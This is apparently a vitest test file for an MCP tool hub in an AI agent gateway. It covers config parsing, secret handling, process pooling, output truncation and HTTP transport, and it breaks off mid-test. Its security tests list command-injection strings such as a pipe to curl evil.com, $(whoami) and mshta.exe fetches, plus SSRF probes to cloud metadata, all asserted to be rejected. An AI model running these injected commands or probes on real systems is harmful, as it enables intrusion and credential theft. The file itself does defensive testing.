// 2.3 / 2.3-R 能力中心（上）MCP 工具管家、常驻进程池、全局渐进式搜索、溢出分页回查、Streamable HTTP 与安全边界测试
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { FeatureKey, McpParseResult, McpServerSummary, McpTestResult, TaskMcpConnections, type IndependentTaskOptions } from '@aic/protocol';
import { parseHttpMcpBody } from '../src/mcp/client';
import {
  MCP_FOLD_THRESHOLD, MCP_GLOBAL_FOLD_TOOL_THRESHOLD, MCP_TOOL_CALL, MCP_TOOL_DESCRIBE, MCP_TOOL_READ_OUTPUT, MCP_TOOL_SEARCH, McpHub,
} from '../src/mcp/hub';
import { parseMcpInput } from '../src/mcp/parser';
import { resolveNpmCmdShim, resolveStdioSpawn } from '../src/mcp/pool';
import { MemorySecretStore } from '../src/secrets';
import { LAN_ALIAS, LAN_SELECTION, startLanGateway } from './fixtures/lan-gateway';
import { makeProject, startGw, type TestGw } from './helpers';

const FAKE_MCP = fileURLToPath(new URL('./fixtures/fake-mcp-server.mjs', import.meta.url));
let gw: TestGw | undefined;
const httpServers: Server[] = [];
const extraHubs: McpHub[] = [];
const tempDirs: string[] = [];

afterEach(async () => {
  for (const hub of extraHubs.splice(0)) {
    await hub.close();
  }
  await gw?.stop();
  gw = undefined;
  for (const srv of httpServers.splice(0)) {
    srv.closeAllConnections();
    await new Promise<void>((r) => srv.close(() => r()));
  }
  for (const dir of tempDirs.splice(0)) {
    try { rmSync(dir, { recursive: true, force: true }); } catch { /* ignore */ }
  }
});

describe('2.3 / 2.3-R 能力中心（上）：MCP 工具管家与结果限流网关', () => {
  describe('1. 智能粘贴解析、恶意参数拒绝与 Windows 无 Shell 命令解析', () => {
    it('支持 JSON 片段、claude mcp add、单行命令与 HTTP 地址四种格式并自动识别桌面独占软件', () => {
      const jsonParsed = McpParseResult.parse(parseMcpInput(`\`\`\`json
      {
        "mcpServers": {
          "blender": { "command": "uvx", "args": ["blender-mcp"], "env": { "BLENDER_TOKEN": "fixture-1" } },
          "sentry": { "url": "https://mcp.sentry.dev/mcp", "headers": { "Authorization": "Bearer fixture-2" } }
        }
      }
      \`\`\``));
      expect(jsonParsed.format).toBe('json');
      expect(jsonParsed.candidates).toHaveLength(2);
      expect(jsonParsed.candidates[0]).toMatchObject({ name: 'blender', transport: 'stdio', concurrency: 'exclusive' });
      expect(jsonParsed.candidates[1]).toMatchObject({ name: 'sentry', transport: 'http', concurrency: 'shared' });

      const cliStdio = parseMcpInput('claude mcp add demo-fs -e DEMO_KEY=abc123 -- npx -y @modelcontextprotocol/server-filesystem /tmp');
      expect(cliStdio.format).toBe('claude_cli');
      expect(cliStdio.candidates[0]).toMatchObject({
        name: 'demo-fs',
        transport: 'stdio',
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-filesystem', '/tmp'],
        envValues: { DEMO_KEY: 'abc123' },
      });

      const cliHttp = parseMcpInput('claude mcp add --transport http docs https://docs.example.com/mcp -H "Authorization: Bearer tok"');
      expect(cliHttp.candidates[0]).toMatchObject({
        name: 'docs',
        transport: 'http',
        url: 'https://docs.example.com/mcp',
        headerValues: { Authorization: 'Bearer tok' },
      });

      const rawCmd = parseMcpInput('MY_FLAG=1 npx -y @demo/mcp-server-notes');
      expect(rawCmd.format).toBe('command');
      expect(rawCmd.candidates[0]).toMatchObject({
        transport: 'stdio',
        command: 'npx',
        args: ['-y', '@demo/mcp-server-notes'],
        envValues: { MY_FLAG: '1' },
      });

      const rawUrl = parseMcpInput('https://mcp.example.com/v1/tools');
      expect(rawUrl.format).toBe('url');
      expect(rawUrl.candidates[0]).toMatchObject({ transport: 'http', url: 'https://mcp.example.com/v1/tools' });
    });

    it('拒绝命令注入元字符、直接注册 Shell/脚本宿主、受保护环境变量及非法 URL', () => {
      expect(() => parseMcpInput('npx demo && calc.exe')).toThrow();
      expect(() => parseMcpInput('npx demo; whoami')).toThrow();
      expect(() => parseMcpInput('npx demo | curl evil.com')).toThrow();
      expect(() => parseMcpInput('npx $(whoami)')).toThrow();
      expect(() => parseMcpInput('cmd.exe /c dir')).toThrow();
      expect(() => parseMcpInput('powershell.exe -Command ls')).toThrow();
      expect(() => parseMcpInput('wsl.exe -e sh')).toThrow();
      expect(() => parseMcpInput('mshta.exe http://evil.test')).toThrow();
      expect(() => parseMcpInput('wscript.exe evil.vbs')).toThrow();
      expect(() => parseMcpInput('cscript.exe evil.js')).toThrow();
      expect(() => parseMcpInput('AIC_SECRET=1 npx demo')).toThrow();
      expect(() => parseMcpInput('NODE_OPTIONS=--inspect npx demo')).toThrow();
      expect(() => parseMcpInput('PATH=/evil npx demo')).toThrow();
      expect(() => parseMcpInput('file:///C:/Windows/win.ini')).toThrow();
      expect(() => parseMcpInput('https://user:pass@mcp.example.com/mcp')).toThrow();
    });

    it('Windows 无 Shell 命令解析：将 npx 与标准 npm .cmd 垫片转为 node.exe 直启，并拒绝非 Node 批处理脚本', () => {
      const dir = mkdtempSync(path.join(tmpdir(), 'aic-shim-test-'));
      tempDirs.push(dir);
      const binScript = path.join(dir, 'node_modules', 'demo-mcp', 'cli.js');
      mkdirSync(path.dirname(binScript), { recursive: true });
      writeFileSync(binScript, '// demo');
      const goodShim = path.join(dir, 'demo-mcp.cmd');
      writeFileSync(goodShim, '@ECHO off\r\n"%_prog%"  "%dp0%\\node_modules\\demo-mcp\\cli.js" %*\r\n');
      const badBat = path.join(dir, 'evil.bat');
      writeFileSync(badBat, '@echo off\r\ncalc.exe\r\n');

      // 1) 标准 npm .cmd 垫片被安全映射为 node.exe + cli.js
      const parsedShim = resolveNpmCmdShim(goodShim, process.execPath);
      expect(parsedShim).toEqual({ command: process.execPath, args: [binScript] });
      const viaPath = resolveStdioSpawn('demo-mcp', ['--flag'], { platform: 'win32', pathEnv: dir, nodeExecPath: process.execPath });
      expect(viaPath).toEqual({ command: process.execPath, args: [binScript, '--flag'] });

      // 2) 非 Node .bat 脚本被明确拒绝
      expect(() => resolveStdioSpawn(badBat, [], { platform: 'win32', nodeExecPath: process.execPath })).toThrow(/批处理脚本/);

      // 3) 若当前环境 Node 安装目录下有 npx-cli.js，resolveStdioSpawn('npx', ...) 直接解析为 node.exe + npx-cli.js
      if (process.platform === 'win32') {
        const npxResolved = resolveStdioSpawn('npx', ['-y', '@demo/pkg'], { platform: 'win32', nodeExecPath: process.execPath });
        expect(npxResolved.command).toBe(process.execPath);
        expect(npxResolved.args[0]!.toLowerCase()).toMatch(/npx-cli\.js$/);
        expect(npxResolved.args.slice(1)).toEqual(['-y', '@demo/pkg']);
      }
    });
  });

  describe('2. 密钥加密、常驻 Stdio 进程池、头尾截断与溢出分页回查、全局渐进式搜索', () => {
    it('密钥加密不落明文；常驻进程复用同 PID 有状态自增、崩溃自动拉起、头尾截断保留尾报错并支持任务隔离分页回查', async () => {
      const prevAic = process.env.AIC_TEST_LEAK;
      const prevOpenAi = process.env.OPENAI_API_KEY;
      process.env.AIC_TEST_LEAK = 'gateway-internal-token';
      process.env.OPENAI_API_KEY = 'sk-host-should-not-leak';
      try {
        gw = await startGw({ secretStore: new MemorySecretStore() });
        const token = await gw.pair('本机');
        const project = await makeProject(gw, token, 'MCP 演示');
        const taskId = (await gw.api('POST', '/tasks', {
          token,
          body: { projectId: project.id, groupId: null, prompt: 'MCP 检查', agent: 'fake', permission: 'readonly', deferPrompt: true },
        })).json.id as string;
        const otherTaskId = (await gw.api('POST', '/tasks', {
          token,
          body: { projectId: project.id, groupId: null, prompt: '另一条任务', agent: 'fake', permission: 'readonly', deferPrompt: true },
        })).json.id as string;

        const secretPlain = 'fixture-mcp-secret-9x8y';
        const createRes = await gw.api('POST', '/mcp/servers', {
          token,
          body: {
            name: 'local-fake',
            description: '本地假 MCP 工具',
            transport: 'stdio',
            command: process.execPath,
            args: [FAKE_MCP, '--paged'],
            envValues: { DEMO_SECRET: secretPlain },
            concurrency: 'exclusive',
            agents: [],
            enabled: true,
          },
        });
        expect(createRes.status).toBe(201);
        const created = McpServerSummary.parse(createRes.json);
        expect(created.envSecrets).toEqual([{ key: 'DEMO_SECRET', hint: '9x8y', hasValue: true }]);
        expect(JSON.stringify(created)).not.toContain(secretPlain);
        expect(gw.gw.services.db.all('SELECT id FROM secrets')).toHaveLength(1);

        // 连接测试：支持 tools/list nextCursor 分页拉全 3 个工具，并预热常驻进程池
        const testRes = await gw.api('POST', `/mcp/servers/${created.id}/test`, { token, body: {} });
        expect(testRes.status).toBe(200);
        const tested = McpTestResult.parse(testRes.json);
        expect(tested.ok).toBe(true);
        expect(tested.tools.map((t) => t.name)).toEqual(['echo', 'counter', 'hang']);
        expect(gw.gw.services.mcp.hasPooledProcess(created.id)).toBe(true);

        const { definitions } = gw.gw.services.mcp.exposedToolsFor(taskId, 'fake');
        const echoTool = definitions.find((d) => d.name.endsWith('__echo'))!;
        const counterTool = definitions.find((d) => d.name.endsWith('__counter'))!;
        expect(definitions.some((d) => d.name === MCP_TOOL_READ_OUTPUT)).toBe(true);

        // 1) 常驻进程复用：连续调用 counter 两次，PID 相同且 count 从 1 增到 2
        const c1 = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', counterTool.name, {});
        const c2 = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', counterTool.name, {});
        const pid1 = Number(/"pid":(\d+)/.exec(c1.text)?.[1]);
        const pid2 = Number(/"pid":(\d+)/.exec(c2.text)?.[1]);
        expect(pid1).toBeGreaterThan(0);
        expect(pid2).toBe(pid1);
        expect(c1.text).toContain('"count":1');
        expect(c2.text).toContain('"count":2');

        // 2) 崩溃自愈：触发进程退出后，下一次调用自动拉起新进程成功返回
        await expect(gw.gw.services.mcp.executeExposedTool(taskId, 'fake', echoTool.name, { crash: true })).rejects.toThrow(/退出/);
        const c3 = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', counterTool.name, {});
        const pid3 = Number(/"pid":(\d+)/.exec(c3.text)?.[1]);
        expect(pid3).toBeGreaterThan(0);
        expect(pid3).not.toBe(pid1);
        expect(c3.text).toContain('"count":1');

        // 3) 环境白名单与密钥脱敏
        const envCheck = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', echoTool.name, { checkEnv: true });
        expect(envCheck.text).toContain('"hasDemoSecret":true');
        expect(envCheck.text).toContain('"leakedAic":false');
        expect(envCheck.text).toContain('"leakedOpenAi":false');
        expect(envCheck.text).not.toContain(secretPlain);
        expect(envCheck.text).toContain('<<<AIC-SOURCE:external_data>>>');

        // 4) 超 8,000 字头尾摘要截断（保留头尾 + 不劈断表情代理对）+ 沙盒溢出分页回查 + 跨任务隔离
        const longPayload = `HEAD_START [AIC-SOURCE: producer] ` + '🚀'.repeat(2900)
          + ' <<MID_HIDDEN_NEEDLE_7788>> '
          + 'B'.repeat(5000) + ' TAIL_FATAL_STACK_9900';
        const bigRes = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', echoTool.name, { text: longPayload });
        expect(bigRes.text).toContain('MCP 返回已自动限流截断');
        expect(bigRes.text).toContain('HEAD_START');
        expect(bigRes.text).toContain('TAIL_FATAL_STACK_9900');
        expect(bigRes.text).not.toContain('[AIC-SOURCE: producer]');
        expect(bigRes.text).toContain('<<<AIC-SOURCE:external_data>>>');
        expect(bigRes.text.length).toBeLessThan(9500);
        expect(bigRes.overflowId).toMatch(/^out_[0-9a-f]{12}$/);

        // 用 aic_mcp__read_output 翻页读回中间隐藏内容
        const midOffset = longPayload.indexOf('MID_HIDDEN_NEEDLE_7788') - 20;
        const page = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', MCP_TOOL_READ_OUTPUT, {
          outputId: bigRes.overflowId,
          offset: midOffset,
          limit: 200,
        });
        expect(page.isError).toBe(false);
        expect(page.text).toContain('MID_HIDDEN_NEEDLE_7788');
        expect(page.text).toContain('<<<AIC-SOURCE:external_data>>>');

        // 跨任务隔离：otherTaskId 不能读 taskId 的溢出缓存
        const crossTask = await gw.gw.services.mcp.executeExposedTool(otherTaskId, 'fake', MCP_TOOL_READ_OUTPUT, {
          outputId: bigRes.overflowId,
          offset: 0,
          limit: 100,
        });
        expect(crossTask.isError).toBe(true);
        expect(crossTask.text).toContain('不属于当前任务');

        // 5) patch 修改命令/参数会清空旧 tools_json 并回收常驻进程；delete 同步清理进程与密钥
        const patched = await gw.api('PATCH', `/mcp/servers/${created.id}`, {
          token,
          body: { args: [FAKE_MCP] },
        });
        expect(patched.status).toBe(200);
        expect(patched.json.tools).toEqual([]);
        expect(patched.json.status).toBe('idle');
        expect(gw.gw.services.mcp.hasPooledProcess(created.id)).toBe(false);

        const delRes = await gw.api('DELETE', `/mcp/servers/${created.id}`, { token });
        expect(delRes.status).toBe(200);
        expect(gw.gw.services.db.all('SELECT id FROM secrets')).toHaveLength(0);
      } finally {
        if (prevAic === undefined) delete process.env.AIC_TEST_LEAK; else process.env.AIC_TEST_LEAK = prevAic;
        if (prevOpenAi === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = prevOpenAi;
      }
    });

    it('跨服务总工具 >25 触发全局渐进式搜索，支持跨服务检索/消歧/调用，并验证超时回收、空闲回收与单行 OOM 防护', async () => {
      gw = await startGw({ secretStore: new MemorySecretStore() });
      const token = await gw.pair('本机');
      const project = await makeProject(gw, token, '全局折叠与池回收');
      const taskId = (await gw.api('POST', '/tasks', {
        token,
        body: { projectId: project.id, groupId: null, prompt: '全局搜索测试', agent: 'fake', permission: 'readonly', deferPrompt: true },
      })).json.id as string;

      // 注册两个各 15 个工具的服务（单服务均 <=40，但跨服务总计 30 > 25）
      expect(MCP_FOLD_THRESHOLD).toBe(40);
      expect(MCP_GLOBAL_FOLD_TOOL_THRESHOLD).toBe(25);
      const s1 = (await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'suite-a', transport: 'stdio', command: process.execPath, args: [FAKE_MCP, '--many=15'] },
      })).json.id as string;
      const s2 = (await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'suite-b', transport: 'stdio', command: process.execPath, args: [FAKE_MCP, '--many=15'] },
      })).json.id as string;
      expect((await gw.api('POST', `/mcp/servers/${s1}/test`, { token, body: {} })).json.ok).toBe(true);
      expect((await gw.api('POST', `/mcp/servers/${s2}/test`, { token, body: {} })).json.ok).toBe(true);

      const exposed = gw.gw.services.mcp.exposedToolsFor(taskId, 'independent');
      expect(exposed.globalFolded).toBe(true);
      expect(exposed.definitions.map((d) => d.name)).toEqual([
        MCP_TOOL_SEARCH,
        MCP_TOOL_DESCRIBE,
        MCP_TOOL_CALL,
        MCP_TOOL_READ_OUTPUT,
      ]);

      // 全局搜索跨两个服务
      const searched = await gw.gw.services.mcp.executeExposedTool(taskId, 'independent', MCP_TOOL_SEARCH, { query: '灯光' });
      expect(searched.text).toContain('[suite-a] tool_13');
      expect(searched.text).toContain('[suite-b] tool_13');

      // 同名工具不传 server 会给出明确消歧提示
      const ambiguous = await gw.gw.services.mcp.executeExposedTool(taskId, 'independent', MCP_TOOL_DESCRIBE, { name: 'tool_13' });
      expect(ambiguous.isError).toBe(true);
      expect(ambiguous.text).toContain('多个 MCP 服务');

      // 指定 server 后准确查看与调用
      const described = await gw.gw.services.mcp.executeExposedTool(taskId, 'independent', MCP_TOOL_DESCRIBE, { name: 'tool_13', server: 'suite-b' });
      expect(described.isError).toBe(false);
      expect(described.text).toContain('所属服务：suite-b');
      const called = await gw.gw.services.mcp.executeExposedTool(taskId, 'independent', MCP_TOOL_CALL, {
        name: 'tool_13',
        server: 'suite-b',
        arguments: { note: '主光源' },
      });
      expect(called.isError).toBe(false);
      expect(called.text).toContain('called:tool_13:主光源');

      // 独立池验证：超时看门狗 + 空闲自动回收 + stdout 单行超限 OOM 防护
      const fastHub = new McpHub(gw.gw.services.db, gw.gw.services.secrets, gw.gw.services.events, gw.gw.services.processes, {
        port: () => gw!.port,
        timeoutMs: 450,
        idleTtlMs: 250,
        maxStdoutLineBytes: 4096,
      });
      extraHubs.push(fastHub);
      const fastSrv = await fastHub.create({
        name: 'fast-guard',
        description: '',
        transport: 'stdio',
        command: process.execPath,
        args: [FAKE_MCP],
        url: null,
        concurrency: 'shared',
        agents: [],
        enabled: true,
      });
      await fastHub.test(fastSrv.id);

      // 空闲 250ms 后自动回收常驻进程
      expect(fastHub.hasPooledProcess(fastSrv.id)).toBe(true);
      await new Promise((r) => setTimeout(r, 420));
      expect(fastHub.hasPooledProcess(fastSrv.id)).toBe(false);

      // 单行输出超 4 KB 触发 OOM 防护并强杀回收
      await expect(fastHub.executeExposedTool(taskId, 'independent', MCP_TOOL_CALL, {
        name: 'echo',
        server: 'fast-guard',
        arguments: { hugeLineBytes: 8192 },
      })).rejects.toThrow(/安全上限/);
      expect(fastHub.hasPooledProcess(fastSrv.id)).toBe(false);

      // 挂起工具触发 450ms 看门狗超时并回收进程
      await expect(fastHub.executeExposedTool(taskId, 'independent', MCP_TOOL_CALL, {
        name: 'hang',
        server: 'fast-guard',
        arguments: {},
      })).rejects.toThrow(/超时|未返回/);
      expect(fastHub.activePoolCount()).toBe(0);
    });

    it('测试连接进行中并发停用服务时，不会用旧快照把服务覆写回 ready', async () => {
      gw = await startGw({ secretStore: new MemorySecretStore() });
      const token = await gw.pair('本机');
      const created = await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'slow-probe', transport: 'stdio', command: process.execPath, args: [FAKE_MCP, '--delay-list=350'] },
      });
      const srvId = created.json.id as string;

      const testPromise = gw.api('POST', `/mcp/servers/${srvId}/test`, { token, body: {} });
      await new Promise((r) => setTimeout(r, 80));
      const patchRes = await gw.api('PATCH', `/mcp/servers/${srvId}`, { token, body: { enabled: false } });
      expect(patchRes.status).toBe(200);

      const testRes = await testPromise;
      expect(testRes.status).toBe(200);
      expect(testRes.json.server.enabled).toBe(false);
      expect(testRes.json.server.status).toBe('disabled');
      expect(gw.gw.services.mcp.hasPooledProcess(srvId)).toBe(false);
    });

    it('Streamable HTTP MCP：完整兼容 event: message SSE、notifications/initialized、Mcp-Session-Id 复用与 404 自动重握手，并走 2.1 出站门禁', async () => {
      // 单元测试 SSE 解析器
      const sseParsed = parseHttpMcpBody(
        ': keep-alive\n\nevent: message\ndata: {"jsonrpc":"2.0","method":"notifications/progress","params":{}}\n\nevent: message\ndata: {"jsonrpc":"2.0","id":2,"result":{"ok":true}}\n\n',
        'text/event-stream',
        2,
      );
      expect(sseParsed).toEqual({ jsonrpc: '2.0', id: 2, result: { ok: true } });

      let initCount = 0;
      let initializedSeen = false;
      let activeSession = 'sess-1';
      let expireOnce = true;

      const srv = createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (c: Buffer) => chunks.push(c));
        req.on('end', () => {
          const msg = JSON.parse(Buffer.concat(chunks).toString('utf8')) as { id?: number; method: string; params?: { cursor?: string } };
          if (msg.method === 'initialize') {
            initCount++;
            activeSession = `sess-${initCount}`;
            initializedSeen = false;
            res.setHeader('content-type', 'text/event-stream');
            res.setHeader('mcp-session-id', activeSession);
            res.end(`event: message\ndata: ${JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { protocolVersion: '2025-06-18', capabilities: { tools: {} } } })}\n\n`);
            return;
          }
          if (msg.method === 'notifications/initialized') {
            initializedSeen = true;
            res.statusCode = 202;
            res.end();
            return;
          }
          if (!initializedSeen) {
            res.statusCode = 400;
            res.end(JSON.stringify({ error: 'missing notifications/initialized' }));
            return;
          }
          if (req.headers['mcp-session-id'] !== activeSession) {
            res.statusCode = 404;
            res.end('session expired');
            return;
          }
          if (msg.method === 'tools/list') {
            res.setHeader('content-type', 'text/event-stream');
            if (!msg.params?.cursor) {
              res.end(`event: message\ndata: ${JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { tools: [{ name: 'ping_http', description: 'HTTP 第一页' }], nextCursor: 'page-2' } })}\n\n`);
            } else {
              res.end(`event: message\ndata: ${JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { tools: [{ name: 'pong_http', description: 'HTTP 第二页' }] } })}\n\n`);
            }
            return;
          }
          // 模拟第二次 tools/call 会话过期（HTTP 404），验证客户端自动重握手
          if (msg.method === 'tools/call' && expireOnce) {
            expireOnce = false;
            res.statusCode = 404;
            res.end('session expired');
            return;
          }
          res.setHeader('content-type', 'text/event-stream');
          res.end(`event: message\ndata: ${JSON.stringify({ jsonrpc: '2.0', id: msg.id, result: { content: [{ type: 'text', text: `hdr:${req.headers['x-custom-auth'] ?? ''}|sid:${activeSession}` }] } })}\n\n`);
        });
      });
      await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
      httpServers.push(srv);
      const httpPort = (srv.address() as { port: number }).port;

      gw = await startGw({ secretStore: new MemorySecretStore() });
      const token = await gw.pair('本机');
      const proj = await makeProject(gw, token, 'HTTP MCP');
      const taskId = (await gw.api('POST', '/tasks', {
        token,
        body: { projectId: proj.id, groupId: null, prompt: 'HTTP 测试', agent: 'fake', permission: 'readonly', deferPrompt: true },
      })).json.id as string;

      // 1. 合法本地 Streamable HTTP MCP 测试通过（验证 SSE + notifications/initialized + 分页 2 页）
      const okSrv = await gw.api('POST', '/mcp/servers', {
        token,
        body: {
          name: 'local-http',
          transport: 'http',
          url: `http://127.0.0.1:${httpPort}/mcp`,
          headerValues: { 'X-Custom-Auth': 'secret-header-val' },
        },
      });
      expect(okSrv.status).toBe(201);
      const okTest = await gw.api('POST', `/mcp/servers/${okSrv.json.id}/test`, { token, body: {} });
      expect(okTest.status).toBe(200);
      expect(okTest.json.ok).toBe(true);
      expect(okTest.json.tools.map((t: { name: string }) => t.name)).toEqual(['ping_http', 'pong_http']);
      expect(initCount).toBe(1);

      // 2. 首次调用命中 404 自动重握手成功（initCount=2），下一次直接复用 sess-2（initCount 仍为 2），且响应中的密钥被脱敏
      const pingTool = gw.gw.services.mcp.exposedToolsFor(taskId, 'fake').definitions.find((d) => d.name.endsWith('__ping_http'))!;
      const call1 = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', pingTool.name, {});
      expect(initCount).toBe(2);
      expect(call1.text).toContain('sid:sess-2');
      expect(call1.text).not.toContain('secret-header-val');
      const call2 = await gw.gw.services.mcp.executeExposedTool(taskId, 'fake', pingTool.name, {});
      expect(initCount).toBe(2);
      expect(call2.text).toContain('sid:sess-2');

      // 3. 企图回打 Gateway 自身监听端口与云元数据 169.254.169.254 -> 均被 2.1 出站门禁拦截
      const selfSrv = await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'self-probe', transport: 'http', url: `http://127.0.0.1:${gw.port}/api/v1/hello` },
      });
      const selfTest = await gw.api('POST', `/mcp/servers/${selfSrv.json.id}/test`, { token, body: {} });
      expect(selfTest.json.ok).toBe(false);
      expect(selfTest.json.error).toContain('端口');

      const metaSrv = await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'meta-probe', transport: 'http', url: 'http://169.254.169.254/latest/meta-data/' },
      });
      const metaTest = await gw.api('POST', `/mcp/servers/${metaSrv.json.id}/test`, { token, body: {} });
      expect(metaTest.json.ok).toBe(false);
    });
  });

  describe('3. 功能开关、任务级连接覆盖、局域网只读边界与独立 Agent 容错闭环', () => {
    it('/hello 开放 pages.capabilities，支持按任务临时停用 MCP，且局域网写/测接口全部 403', async () => {
      const lanGw = await startLanGateway({ secretStore: new MemorySecretStore() });
      gw = lanGw;
      const localToken = await lanGw.pair('本机');
      const remoteToken = await lanGw.pair('局域网手机');
      expect((await lanGw.api('PUT', '/access/lan', { token: localToken, body: LAN_SELECTION })).status).toBe(200);

      const helloRes = await lanGw.api('GET', '/hello', { token: localToken });
      expect(helloRes.status).toBe(200);
      expect(helloRes.json.features[FeatureKey.PageCapabilities]).toBe(true);

      const created = await lanGw.api('POST', '/mcp/servers', {
        token: localToken,
        body: { name: 'task-mcp', transport: 'stdio', command: process.execPath, args: [FAKE_MCP] },
      });
      expect(created.status).toBe(201);
      const mcpId = created.json.id as string;
      expect((await lanGw.api('POST', `/mcp/servers/${mcpId}/test`, { token: localToken, body: {} })).json.ok).toBe(true);

      const proj = await makeProject(lanGw, localToken, '连接面板');
      const taskId = (await lanGw.api('POST', '/tasks', {
        token: localToken,
        body: { projectId: proj.id, groupId: null, prompt: '查连接', agent: 'fake', permission: 'readonly', deferPrompt: true },
      })).json.id as string;

      const conn1 = TaskMcpConnections.parse((await lanGw.api('GET', `/tasks/${taskId}/mcp`, { token: localToken })).json);
      expect(conn1.servers[0]).toMatchObject({ id: mcpId, activeForTask: true, disabledForTask: false });
      expect(lanGw.gw.services.mcp.exposedToolsFor(taskId, 'fake').definitions.length).toBeGreaterThan(0);

      const conn2 = TaskMcpConnections.parse((await lanGw.api('PUT', `/tasks/${taskId}/mcp`, {
        token: localToken,
        body: { disabledServerIds: [mcpId] },
      })).json);
      expect(conn2.servers[0]).toMatchObject({ id: mcpId, activeForTask: false, disabledForTask: true });
      expect(lanGw.gw.services.mcp.exposedToolsFor(taskId, 'fake').definitions).toHaveLength(0);

      expect((await lanGw.api('GET', '/mcp/servers', { token: remoteToken, loopback: LAN_ALIAS })).status).toBe(200);
      expect((await lanGw.api('GET', `/tasks/${taskId}/mcp`, { token: remoteToken, loopback: LAN_ALIAS })).status).toBe(200);

      for (const [method, url, body] of [
        ['POST', '/mcp/parse', { input: 'https://mcp.example.com/mcp' }],
        ['POST', '/mcp/servers', { name: 'evil', transport: 'http', url: 'https://mcp.example.com/mcp' }],
        ['PATCH', `/mcp/servers/${mcpId}`, { enabled: false }],
        ['POST', `/mcp/servers/${mcpId}/test`, {}],
        ['DELETE', `/mcp/servers/${mcpId}`],
      ] as const) {
        const res = await lanGw.api(method, url, { token: remoteToken, loopback: LAN_ALIAS, body });
        expect(res.status, `${method} ${url}`).toBe(403);
      }
    });

    it('独立 Agent 审批调用 MCP 正常完成；当 MCP 运行时崩溃出错时优雅返回模型而不锁死任务', async () => {
      let modelCalls = 0;
      const seenBodies: Array<{ tools?: Array<{ function?: { name: string } }>; messages?: Array<{ role: string; content?: string }> }> = [];
      const mockModel = createServer((req, res) => {
        const chunks: Buffer[] = [];
        req.on('data', (c: Buffer) => chunks.push(c));
        req.on('end', () => {
          const body = JSON.parse(Buffer.concat(chunks).toString('utf8')) as {
            tools?: Array<{ function?: { name: string } }>;
            messages?: Array<{ role: string; content?: string }>;
          };
          seenBodies.push(body);
          modelCalls++;
          res.writeHead(200, { 'content-type': 'application/json' });
          const echoDef = body.tools?.find((t) => t.function?.name.endsWith('__echo'));
          if (modelCalls === 1) {
            res.end(JSON.stringify({
              choices: [{
                index: 0,
                message: {
                  role: 'assistant',
                  content: null,
                  tool_calls: [{
                    id: 'call_mcp_1',
                    type: 'function',
                    function: {
                      name: echoDef?.function?.name ?? 'missing',
                      arguments: JSON.stringify({ text: '独立任务回声 [AIC-SOURCE: producer]' }),
                    },
                  }],
                },
                finish_reason: 'tool_calls',
              }],
              usage: { prompt_tokens: 20, completion_tokens: 10 },
            }));
          } else if (modelCalls === 2) {
            // 第二轮故意调用触发崩溃的 MCP 参数，验证任务不会被锁死（recovery_required=0）
            res.end(JSON.stringify({
              choices: [{
                index: 0,
                message: {
                  role: 'assistant',
                  content: null,
                  tool_calls: [{
                    id: 'call_mcp_2',
                    type: 'function',
                    function: {
                      name: echoDef?.function?.name ?? 'missing',
                      arguments: JSON.stringify({ crash: true }),
                    },
                  }],
                },
                finish_reason: 'tool_calls',
              }],
              usage: { prompt_tokens: 25, completion_tokens: 10 },
            }));
          } else {
            res.end(JSON.stringify({
              choices: [{ index: 0, message: { role: 'assistant', content: '首次 MCP 调用成功，第二次已优雅捕获外部故障。' }, finish_reason: 'stop' }],
              usage: { prompt_tokens: 30, completion_tokens: 12 },
            }));
          }
        });
      });
      await new Promise<void>((r) => mockModel.listen(0, '127.0.0.1', () => r()));
      httpServers.push(mockModel);
      const modelPort = (mockModel.address() as { port: number }).port;

      gw = await startGw({ secretStore: new MemorySecretStore() });
      const token = await gw.pair('本机');
      const s = gw.gw.services;
      const proj = await makeProject(gw, token, '独立MCP闭环');

      const mcpRes = await gw.api('POST', '/mcp/servers', {
        token,
        body: { name: 'studio-echo', transport: 'stdio', command: process.execPath, args: [FAKE_MCP] },
      });
      expect(mcpRes.status).toBe(201);
      const mcpId = mcpRes.json.id as string;
      expect((await gw.api('POST', `/mcp/servers/${mcpId}/test`, { token, body: {} })).json.ok).toBe(true);

      const svc = await s.independent.createService({
        name: '离线夹具模型',
        baseUrl: `http://127.0.0.1:${modelPort}/v1`,
        protocol: 'chat_completions',
        authentication: 'none',
        enabled: true,
        providerId: null,
        plan: null,
        apiVersion: null,
      });
      const model = s.independent.createModel(svc.id, { name: '夹具', remoteModelId: 'fixture' });
      s.independent.overrides(svc.id, model.id, { expectedRevision: model.revision, values: { tools: true, contextWindow: 100_000 } });
      const options: IndependentTaskOptions = {
        selection: { serviceId: svc.id, modelId: model.id },
        generation: { stream: false },
        fileToolVersion: 'separate_v2',
        context: { mode: 'local' },
        limits: { maxModelCalls: 4, maxToolCalls: 4, maxOutputTokens: 1000, maxContextBytes: 1024 * 1024, timeoutMs: 30_000 },
        requestBudget: { maxRequests: 10, money: null },
      };
      const taskRes = await gw.api('POST', '/tasks', {
        token,
        body: { projectId: proj.id, groupId: null, prompt: '调用 studio-echo', agent: 'independent', permission: 'ask', deferPrompt: true, independent: options },
      });
      expect(taskRes.status).toBe(201);
      const taskId = taskRes.json.id as string;

      const deviceId = s.auth.listDevices(null)[0]!.id;
      const off = s.events.bus.on((ev) => {
        if (ev.type === 'approval.requested' && ev.taskId === taskId) {
